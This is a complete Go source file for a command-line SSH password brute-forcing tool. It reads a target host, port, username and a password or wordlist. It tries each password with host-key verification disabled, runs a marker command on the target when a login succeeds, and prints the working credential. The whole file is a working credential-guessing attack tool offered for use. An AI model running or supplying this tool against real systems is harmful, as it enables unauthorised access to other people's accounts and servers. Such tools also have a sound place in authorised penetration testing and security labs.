package main

import (
	"bufio"
	"errors"
	"fmt"
	"os"

	"golang.org/x/crypto/ssh"

	"github.com/akamensky/argparse"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

var logger zerolog.Logger

func successLogger(host string, port int, username string, password string) {
	logger.Info().Str("host", host).Int("port", port).Str("username", username).Str("password", password).
		Msg("\x1b[32m ---= Brute force successful 😈 ! =---\x1b[0m")
}

func BruteForce(host string, port int, username string, password string) bool {

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	addr := host + ":" + fmt.Sprint(port)

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		logger.Error().Err(err).Msg("Failed to connect to SSH server")
		return false
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		logger.Error().Err(err).Msg("Failed to create SSH session")
		return false
	}
	defer session.Close()

	err = session.Run("touch /tmp/ssh-bf-success")
	if err != nil {
		logger.Error().Err(err).Msg("Failed to run command on SSH server")
		return false
	}

	return true
}

func BruteForceList(host string, port int, username string, pass_list string) (string, error) {

	file, err := os.Open(pass_list)
	if err != nil {
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		logger.Debug().Msg("Reading password from file")
		password := scanner.Text()

		if BruteForce(host, port, username, password) {
			return password, nil
		}

		logger.Warn().Str("host", host).Int("port", port).Str("username", username).Str("password", password).Msg("Brute force failed")
	}

	if err := scanner.Err(); err != nil {
		logger.Error().Err(err).Msg("Failed to read password list file")
	}

	return "", errors.New("brute force failed")
}

func main() {
	// logger setup
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()

	// argument parser setup
	parser := argparse.NewParser("ssh-bf", "SSH brute force attack tool")

	host := parser.String("", "host", &argparse.Options{
		Required: true,
		Help:     "Target host",
	})

	port := parser.Int("", "port", &argparse.Options{
		Required: true,
		Help:     "Target port",
	})

	username := parser.String("u", "username", &argparse.Options{
		Required: true,
		Help:     "Account username to brute force",
	})

	password := parser.String("", "password", &argparse.Options{
		Required: false,
		Help:     "Password to brute force, mutually exclusive with password list, only one of them should be used",
	})

	pass_list := parser.String("l", "password-list", &argparse.Options{
		Required: false,
		Help:     "Password list, in a text fromat, to use for brute force, mutually exclusive with password, only one of them should be used",
	})

	debug := parser.Flag("d", "debug", &argparse.Options{
		Required: false,
		Help:     "Enable debug mode",
		Default:  false,
	})

	// parse arguments

	if err := parser.Parse(os.Args); err != nil {
		logger.Fatal().Err(err).Msg("Failed to parse arguments")
	}

	if *host == "" || *port <= 0 || *port >= 65535 || *username == "" {
		logger.Fatal().Msg("Invalid arguments")
	}

	if *debug {
		zerolog.SetGlobalLevel(zerolog.DebugLevel)
		logger.Debug().Msg("Debug mode enabled")
	}

	// try to brute force
	if *pass_list != "" {
		if *password != "" {
			logger.Fatal().Msg("Only one of password or password list argument should be used")
		}

		logger.Debug().Str("host", *host).Int("port", *port).Str("username", *username).Str("password_list", *pass_list).Msg("Trying password list")

		password, err := BruteForceList(*host, *port, *username, *pass_list)
		if err != nil {
			logger.Fatal().Err(err).Msg("Brute force failed")
		}
		successLogger(*host, *port, *username, password)

	} else {
		if !BruteForce(*host, *port, *username, *password) {
			logger.Warn().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force failed")
		} else {
			successLogger(*host, *port, *username, *password)
		}
	}
}
